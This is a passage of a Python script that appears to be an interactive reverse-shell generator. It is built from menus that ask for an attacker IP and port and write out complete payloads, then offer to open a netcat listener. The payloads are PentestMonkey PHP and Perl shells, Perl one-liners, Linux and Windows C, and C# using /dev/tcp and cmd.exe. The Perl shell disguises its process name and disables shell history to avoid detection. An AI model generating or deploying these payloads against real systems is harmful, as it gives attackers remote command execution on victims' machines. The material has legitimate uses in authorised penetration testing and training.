        }} else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {{
            $this->os    = 'WINDOWS';
            $this->shell = 'cmd.exe';
        }} else {{
            $detected = false;
            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";
        }}
        return $detected;
    }}
    private function daemonize() {{
        $exit = false;
        if (!function_exists('pcntl_fork')) {{
            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";
        }} else if (($pid = @pcntl_fork()) < 0) {{
            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";
        }} else if ($pid > 0) {{
            $exit = true;
            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";
        }} else if (posix_setsid() < 0) {{
            // once daemonized you will actually no longer see the script's dump
            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";
        }} else {{
            echo "DAEMONIZE: Completed successfully!\n";
        }}
        return $exit;
    }}
    private function settings() {{
        @error_reporting(0);
        @set_time_limit(0); // do not impose the script execution time limit
        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories
    }}
    private function dump($data) {{
        $data = str_replace('<', '&lt;', $data);
        $data = str_replace('>', '&gt;', $data);
        echo $data;
    }}
    private function read($stream, $name, $buffer) {{
        if (($data = @fread($stream, $buffer)) === false) {{ // suppress an error when reading from a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot read from ${{name}}, script will now exit...\n";
        }}
        return $data;
    }}
    private function write($stream, $name, $data) {{
        if (($bytes = @fwrite($stream, $data)) === false) {{ // suppress an error when writing to a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot write to ${{name}}, script will now exit...\n";
        }}
        return $bytes;
    }}
    // read/write method for non-blocking streams
    private function rw($input, $output, $iname, $oname) {{
        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {{
            if ($this->os === 'WINDOWS' && $oname === 'STDIN') {{ $this->clen += strlen($data); }} // calculate the command length
            $this->dump($data); // script's dump
        }}
    }}
    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
// we must read the exact byte length from a stream and not a single byte more
private function brw($input, $output, $iname, $oname) {{
    $fstat = fstat($input);
    $size = $fstat['size'];
    if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {{
        // for some reason Windows OS pipes STDIN into STDOUT
        // we do not like that
        // we need to discard the data from the stream
        while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {{
            $this->clen -= $bytes;
            $size -= $bytes;
        }}
    }}
    while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {{
        $size -= $bytes;
        $this->dump($data); // script's dump
    }}
}}

public function run() {{
    if ($this->detect() && !$this->daemonize()) {{
        $this->settings();

        // ----- SOCKET BEGIN -----
        $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
        if (!$socket) {{
            echo "SOC_ERROR: {{$errno}}: {{$errstr}}\n";
        }} else {{
            stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS

            // ----- SHELL BEGIN -----
            $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
            if (!$process) {{
                echo "PROC_ERROR: Cannot start the shell\n";
            }} else {{
                foreach ($pipes as $pipe) {{
                    stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS
                }}

                // ----- WORK BEGIN -----
                $status = proc_get_status($process);
                @fwrite($socket, "SOCKET: Shell has connected! PID: " . $status['pid'] . "\n");
                do {{
                    $status = proc_get_status($process);
                    if (feof($socket)) {{ // check for end-of-file on SOCKET
                        echo "SOC_ERROR: Shell connection has been terminated\n"; break;
                    }} else if (feof($pipes[1]) || !$status['running']) {{                 // check for end-of-file on STDOUT or if process is still running
                        echo "PROC_ERROR: Shell process has been terminated\n";   break; // feof() does not work with blocking streams
                    }}                                                                    // use proc_get_status() instead
                    $streams = array(
                        'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
                        'write'  => null,
                        'except' => null
                    );
                    $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // 
                }} while (!$this->error);
                // ------ WORK END ------

                foreach ($pipes as $pipe) {{
                    fclose($pipe);
                }}
                proc_close($process);
            }}
            // ------ SHELL END ------

            fclose($socket);
        }}
        // ------ SOCKET END ------

    }}
}}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('{lhost}', {lport});
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>

"""
		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	php_menu()




def generate_php_pentestmonkey():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = f"""<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = "{lhost}";
$port = {lport};
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

// ... rest of your PHP code ...

if (function_exists('pcntl_fork')) {{
	$pid = pcntl_fork();
	
	if ($pid == -1) {{
		printit("ERROR: Can't fork");
		exit(1);
	}}
	
	if ($pid) {{
		exit(0);  // Parent exits
	}}
	if (posix_setsid() == -1) {{
		printit("Error: Can't setsid()");
		exit(1);
	}}

	$daemon = 1;
}} else {{
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {{
	printit("$errstr ($errno)");
	exit(1);
}}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {{
	printit("ERROR: Can't spawn shell");
	exit(1);
}}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {{
	if (feof($sock)) {{
		printit("ERROR: Shell connection terminated");
		break;
	}}

	if (feof($pipes[1])) {{
		printit("ERROR: Shell process terminated");
		break;
	}}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {{
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}}

	if (in_array($pipes[1], $read_a)) {{
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}}

	if (in_array($pipes[2], $read_a)) {{
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}}
}}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {{
	if (!$daemon) {{
		print "$string\n";
	}}
}}

?>"""


		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	php_menu()



def perl_menu():
	try:
		os.system('clear')
		print_header()
		print(Fore.YELLOW + "Generate perl shellcode" + Style.RESET_ALL)
		nl()
		print(Fore.BLUE + "1. Perl" + Style.RESET_ALL)
		print(Fore.BLUE + "2. Perl no sh" + Style.RESET_ALL)
		print(Fore.BLUE + "3. Perl PentestMonkey" + Style.RESET_ALL)
		print(Fore.RED + "99. Back" + Style.RESET_ALL)
		nl()
		choice = input("Choose the shell you need! (1-3): ")

		if choice == "1":
			generate_perl()
		elif choice == "2":
			generate_perl_no_sh()
		elif choice == "3":
			generate_perl_pentestmonkey()
	except KeyboardInterrupt:
		print("\nInterrupted, returning to main menu.....")
		time.sleep(1)
	main()


def generate_perl_pentestmonkey():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = """
#!/usr/bin/perl -w
# perl-reverse-shell - A Reverse Shell implementation in PERL
# Copyright (C) 2006 pentestmonkey@pentestmonkey.net
#
# This tool may be used for legal purposes only.  Users take full responsibility
# for any actions performed using this tool.  The author accepts no liability
# for damage caused by this tool.  If these terms are not acceptable to you, then
# do not use this tool.
#
# In all other respects the GPL version 2 applies:
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2 as
# published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
#
# This tool may be used for legal purposes only.  Users take full responsibility
# for any actions performed using this tool.  If these terms are not acceptable to
# you, then do not use this tool.
#
# You are encouraged to send comments, improvements or suggestions to
# me at pentestmonkey@pentestmonkey.net
#
# Description
# -----------
# This script will make an outbound TCP connection to a hardcoded IP and port.
# The recipient will be given a shell running as the current user (apache normally).
use strict;
use Socket;
use FileHandle;
use POSIX;
my $VERSION = "1.0";

# Where to send the reverse shell.  Change these.
my $ip = '{0}';
my $port = {1};

# Options
my $daemon = 1;
my $auth   = 0; # 0 means authentication is disabled and any 
        # source IP can access the reverse shell
my $authorised_client_pattern = qr(^127\.0\.0\.1$);

# Declarations
my $global_page = "";
my $fake_process_name = "/usr/sbin/apache";

# Change the process name to be less conspicious
$0 = "[httpd]";

# Authenticate based on source IP address if required
if (defined($ENV{{'REMOTE_ADDR'}})) {{
    cgiprint("Browser IP address appears to be: $ENV{{'REMOTE_ADDR'}}");

    if ($auth) {{
        unless ($ENV{{'REMOTE_ADDR'}} =~ $authorised_client_pattern) {{
            cgiprint("ERROR: Your client isn't authorised to view this page");
            cgiexit();
        }}
    }}
}} elsif ($auth) {{
    cgiprint("ERROR: Authentication is enabled, but I couldn't determine your IP address.  Denying access");
    cgiexit(0);
}}

# Background and dissociate from parent process if required
if ($daemon) {{
    my $pid = fork();
    if ($pid) {{
        cgiexit(0); # parent exits
    }}

    setsid();
    chdir('/');
    umask(0);
}}

# Make TCP connection for reverse shell
socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {{
    cgiprint("Sent reverse shell to $ip:$port");
    cgiprintpage();
}} else {{
    cgiprint("Couldn't open reverse shell to $ip:$port: $!");
    cgiexit();    
}}

# Redirect STDIN, STDOUT and STDERR to the TCP connection
open(STDIN, ">&SOCK");
open(STDOUT,">&SOCK");
open(STDERR,">&SOCK");
$ENV{{'HISTFILE'}} = '/dev/null';
system("w;uname -a;id;pwd");
exec({{"sh"}} ($fake_process_name, "-i"));

# Wrapper around print
sub cgiprint {{
    my $line = shift;
    $line .= "<p>\n";
    $global_page .= $line;
}}

# Wrapper around exit
sub cgiexit {{
    cgiprintpage();
    exit 0; # 0 to ensure we don't give a 500 response.
}}

# Form HTTP response using all the messages gathered by cgiprint so far
sub cgiprintpage {{
    print "Content-Length: " . length($global_page) . "\r
Connection: close\r
Content-Type: text\/html\r\n\r\n" . $global_page;
}}
""".format(lhost, lport)

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	perl_menu()



def generate_perl_no_sh():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = """perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{0}:{1}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'""".format(lhost, lport)

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	perl_menu()



def generate_perl():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = """perl -e 'use Socket;$i="{0}";$p={1};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");}};'""".format(lhost, lport)

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	perl_menu()




def c_menu():
	try:
		os.system('clear')
		print_header()
		print(Fore.YELLOW + "Generate C/C# shellcode" + Style.RESET_ALL)
		nl()
		print(Fore.BLUE + "1. C" + Style.RESET_ALL)
		print(Fore.BLUE + "2. C Windows" + Style.RESET_ALL)
		print(Fore.BLUE + "3. C# TCP Client" + Style.RESET_ALL)
		print(Fore.BLUE + "4. C# Bash -i" + Style.RESET_ALL)
		print(Fore.RED + "99. Back" + Style.RESET_ALL)
		nl()
		choice = input("Choose the shell you need! (1-4): ")

		if choice == "1":
			generate_c()
		elif choice == "2":
			generate_c_windows()
		elif choice == "3":
			generate_c_tcp_client()
		elif choice == "4":
			generate_c_bash_i()
	except KeyboardInterrupt:
		print("\nInterrupted, returning to main menu.....")
		time.sleep(1)
	main()

def generate_c_bash_i():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = """
using System;
using System.Diagnostics;

namespace BackConnect {{
  class ReverseBash {{
	public static void Main(string[] args) {{
	  Process proc = new System.Diagnostics.Process();
	  proc.StartInfo.FileName = "sh";
	  proc.StartInfo.Arguments = string.Format("-c \"sh -i >& /dev/tcp/{1}/{0} 0>&1\"", "{0}", "{1}");
	  proc.StartInfo.UseShellExecute = false;
	  proc.StartInfo.RedirectStandardOutput = true;
	  proc.Start();

	  while (!proc.StandardOutput.EndOfStream) {{
		Console.WriteLine(proc.StandardOutput.ReadLine());
	  }}
	}}
  }}
}}
""".format(lport, lhost)

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	c_menu()


def generate_c_tcp_client():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = """
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{{
    public class Program
    {{
        static StreamWriter streamWriter;
        public static void Main(string[] args)
        {{
            using(TcpClient client = new TcpClient("{0}", {1}))
            {{
                using(Stream stream = client.GetStream())
                {{
                    using(StreamReader rdr = new StreamReader(stream))
                    {{
                        streamWriter = new StreamWriter(stream);

                        StringBuilder strInput = new StringBuilder();

                        Process p = new Process();
                        p.StartInfo.FileName = "sh";
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                        p.Start();
                        p.BeginOutputReadLine();

                        while(true)
                        {{
                            strInput.Append(rdr.ReadLine());
                            //strInput.Append("\n");
                            p.StandardInput.WriteLine(strInput);
                            strInput.Remove(0, strInput.Length);
                        }}
                    }}
                }}
            }}
        }}
        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {{
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {{
                try
                {{
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }}
                catch (Exception err) {{ }}
            }}
        }}

    }}
}}""".format(lhost, lport)



		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	c_menu()


def generate_c_windows():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = """
#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32")

WSADATA wsaData;
SOCKET Winsock;
struct sockaddr_in hax;
char ip_addr[16] = "{0}";
char port[6] = "{1}";

STARTUPINFO ini_processo;

PROCESS_INFORMATION processo_info;

int main()
{{
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

    struct hostent *host; 
    host = gethostbyname(ip_addr);
    strcpy_s(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));

    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi(port));
    hax.sin_addr.s_addr = inet_addr(ip_addr);

    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

    TCHAR cmd[255] = TEXT("cmd.exe");

    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);

    return 0;
}}
""".format(lhost, lport)

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	c_menu()


def generate_c():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = """
		#include <stdio.h>
		#include <sys/socket.h>
		#include <sys/types.h>
		#include <stdlib.h>
		#include <unistd.h>
		#include <netinet/in.h>
		#include <arpa/inet.h>

		int main(void){{
			int port = {0};
			struct sockaddr_in revsockaddr;

			int sockt = socket(AF_INET, SOCK_STREAM, 0);
			revsockaddr.sin_family = AF_INET;
			revsockaddr.sin_port = htons(port);
			revsockaddr.sin_addr.s_addr = inet_addr("{1}");

			connect(sockt, (struct sockaddr *) &revsockaddr, 
			sizeof(revsockaddr));
			dup2(sockt, 0);
			dup2(sockt, 1);
			dup2(sockt, 2);

			char * const argv[] = {{"sh", NULL}};
			execve("/bin/sh", argv, NULL);

			return 0;
		}}
		""".format(lhost, lport)


		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	c_menu()




def netcat_menu():
	try:
		os.system('clear')
		print_header()
		print(Fore.YELLOW + "Generate netcat shell" + Style.RESET_ALL)
		nl()
		print(Fore.BLUE + "1. nc mkfifo" + Style.RESET_ALL)
		print(Fore.BLUE + "2. nc -e" + Style.RESET_ALL)
		print(Fore.BLUE + "3. nc.exe -e" + Style.RESET_ALL)
		print(Fore.BLUE + "4. BusyBox nc -e" + Style.RESET_ALL)
		print(Fore.BLUE + "5. nc -c" + Style.RESET_ALL)
		print(Fore.BLUE + "6. ncat -e" + Style.RESET_ALL)
		print(Fore.BLUE + "7. ncat.exe -e" + Style.RESET_ALL)
		print(Fore.BLUE + "8. ncat udp" + Style.RESET_ALL)
		print(Fore.BLUE + "9. rustcat" + Style.RESET_ALL)
		print(Fore.RED + "99. Back" + Style.RESET_ALL)
		nl()
		choice = input("Choose the shell you need! (1-9): ")

		if choice == "1":
			generate_nc_mkfifo()
		elif choice == "2":
			generate_nc_e()
		elif choice == "3":
			generate_nc_exe_e()
		elif choice == "4":
			generate_busy_box_nc_e()
		elif choice == "5":
			generate_nc_c()
		elif choice == "6":
			generate_ncat_e()
		elif choice == "7":
			generate_ncat_exe_e()
		elif choice == "8":
			generate_ncat_udp()
		elif choice == "9":
